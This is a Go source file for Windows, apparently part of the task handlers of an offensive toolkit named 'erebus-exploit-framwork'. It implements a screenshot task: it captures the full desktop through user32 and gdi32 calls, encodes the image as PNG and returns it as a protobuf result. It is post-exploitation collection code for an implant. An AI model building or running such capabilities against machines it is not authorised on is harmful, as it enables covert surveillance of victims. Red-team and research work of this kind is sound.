//go:build windows

package tasks

import (
	"bytes"
	"context"
	"fmt"
	"image"
	"image/png"
	"unsafe"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"golang.org/x/sys/windows"
	"google.golang.org/protobuf/proto"
)

var (
	user32   = windows.NewLazyDLL("user32.dll")
	gdi32    = windows.NewLazyDLL("gdi32.dll")

	procGetDesktopWindow = user32.NewProc("GetDesktopWindow")
	procGetDC            = user32.NewProc("GetDC")
	procReleaseDC        = user32.NewProc("ReleaseDC")
	procGetSystemMetrics = user32.NewProc("GetSystemMetrics")

	procCreateCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
	procSelectObject           = gdi32.NewProc("SelectObject")
	procBitBlt                 = gdi32.NewProc("BitBlt")
	procDeleteObject           = gdi32.NewProc("DeleteObject")
	procDeleteDC               = gdi32.NewProc("DeleteDC")
	procGetDIBits              = gdi32.NewProc("GetDIBits")
)

const (
	smCxScreen = 0
	smCyScreen = 1
	srccopy    = 0x00CC0020
	biRGB      = 0
)

type bitmapInfoHeader struct {
	BiSize          uint32
	BiWidth         int32
	BiHeight        int32
	BiPlanes        uint16
	BiBitCount      uint16
	BiCompression   uint32
	BiSizeImage     uint32
	BiXPelsPerMeter int32
	BiYPelsPerMeter int32
	BiClrUsed       uint32
	BiClrImportant  uint32
}

func executeScreenshot(_ context.Context, data []byte) ([]byte, error) {
	task := &pb.ScreenshotTask{}
	if len(data) > 0 {
		proto.Unmarshal(data, task)
	}

	hwnd, _, _ := procGetDesktopWindow.Call()
	hdc, _, _ := procGetDC.Call(hwnd)
	defer procReleaseDC.Call(hwnd, hdc)

	width, _, _ := procGetSystemMetrics.Call(smCxScreen)
	height, _, _ := procGetSystemMetrics.Call(smCyScreen)

	memDC, _, _ := procCreateCompatibleDC.Call(hdc)
	defer procDeleteDC.Call(memDC)

	hBitmap, _, _ := procCreateCompatibleBitmap.Call(hdc, width, height)
	defer procDeleteObject.Call(hBitmap)

	procSelectObject.Call(memDC, hBitmap)
	procBitBlt.Call(memDC, 0, 0, width, height, hdc, 0, 0, srccopy)

	// Get bitmap data
	bmi := bitmapInfoHeader{
		BiSize:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
		BiWidth:       int32(width),
		BiHeight:      -int32(height), // top-down
		BiPlanes:      1,
		BiBitCount:    32,
		BiCompression: biRGB,
	}

	imgSize := int(width) * int(height) * 4
	buf := make([]byte, imgSize)

	procGetDIBits.Call(memDC, hBitmap, 0, height, uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&bmi)), 0)

	// Convert BGRA to RGBA
	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
	for i := 0; i < len(buf)-3; i += 4 {
		img.Pix[i+0] = buf[i+2] // R
		img.Pix[i+1] = buf[i+1] // G
		img.Pix[i+2] = buf[i+0] // B
		img.Pix[i+3] = buf[i+3] // A
	}

	var pngBuf bytes.Buffer
	if err := png.Encode(&pngBuf, img); err != nil {
		return nil, fmt.Errorf("encode png: %w", err)
	}

	result := &pb.ScreenshotResult{
		ImageData: pngBuf.Bytes(),
		Format:    "png",
		Width:     uint32(width),
		Height:    uint32(height),
	}
	return proto.Marshal(result)
}
